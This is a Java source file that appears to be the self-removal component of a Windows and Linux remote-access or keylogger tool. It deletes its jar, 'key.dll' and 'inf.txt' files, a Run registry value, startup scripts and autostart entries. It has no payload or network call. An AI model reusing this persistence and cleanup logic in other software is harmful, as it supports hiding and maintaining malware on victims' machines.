/**
 *
 * @author AngelCruel
 */


import java.io.File;
import java.io.IOException;
import java.util.Locale;
import java.util.logging.Level;
import java.util.logging.Logger;

public class Main {

    public static void main(String[] args) {
        try {
            if (System.getProperty("os.name").toUpperCase().indexOf("WINDOWS") != -1) {
                Thread.sleep(10000);

                File f = new File(System.getenv("systemroot") + "\\dsf34rsdfew");
                if (f.mkdir()) {
                    File file = new File(System.getenv("systemroot") + "\\system32\\" + args[0] + ".jar");
                    while (file.exists()) {
                        file.delete();
                    }
                    File file2 = new File(System.getenv("systemroot") + "\\system32\\inf.txt");
                    if (file2.exists()) {
                        file2.delete();
                    }
                    File file3 = new File(System.getenv("systemroot") + "\\system32\\key.dll");
                    if (file3.exists()) {
                        file3.delete();
                    }
                    Runtime.getRuntime().exec("reg delete hklm\\software\\microsoft\\windows\\currentversion\\run /v \"" + args[1] + "\" /f");
                    f.delete();
                } else {
                    File file = new File(System.getenv("APPDATA") + "\\" + args[0] + ".jar");
                    while (file.exists()) {
                        file.delete();
                    }
                    File file2 = new File(System.getenv("APPDATA") + "\\inf.txt");
                    if (file2.exists()) {
                        file2.delete();
                    }
                    File file3 = new File(System.getenv("APPDATA") + "\\key.dll");
                    if (file3.exists()) {
                        file3.delete();
                    }

                    File file4 = new File(System.getenv("APPDATA") + "\\" + args[0] + ".bat");
                    if (file4.exists()) {
                        file4.delete();
                    }

                    String startup;
                    if (System.getProperty("os.name").toUpperCase().indexOf("WINDOWS 7") != -1 || System.getProperty("os.name").toUpperCase().indexOf("WINDOWS VISTA") != -1) {
                        startup = "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
                    } else {
                        if (Locale.getDefault().getLanguage().equals("es")) {
                            startup = "\\Menú Inicio\\Programas\\Inicio\\";
                        } else {
                            startup = "\\Start Menu\\Programs\\Startup";
                        }
                    }
                    File file5 = new File(System.getProperty("user.home") + startup + args[0] + ".vbs");
                    if (file5.exists()) {
                        file5.delete();
                    }
                }
            }
            if (System.getProperty("os.name").toUpperCase().indexOf("LINUX") != -1) {
                Runtime.getRuntime().exec("rm /home/" + System.getProperty("user.name") + "/.config/autostart/" + args[0] + ".desktop");
                Runtime.getRuntime().exec("rm /home/" + System.getProperty("user.name") + "/.config/" + args[0] + ".jar");
                Runtime.getRuntime().exec("rm /home/" + System.getProperty("user.name") + "/.config/" + args[0]);
            }
            if (System.getProperty("os.name").toUpperCase().indexOf("MAC") != -1) {
            }
        } catch (IOException ex) {
            Logger.getLogger(Main.class.getName()).log(Level.SEVERE, null, ex);
        } catch (InterruptedException ex) {
            Logger.getLogger(Main.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
}
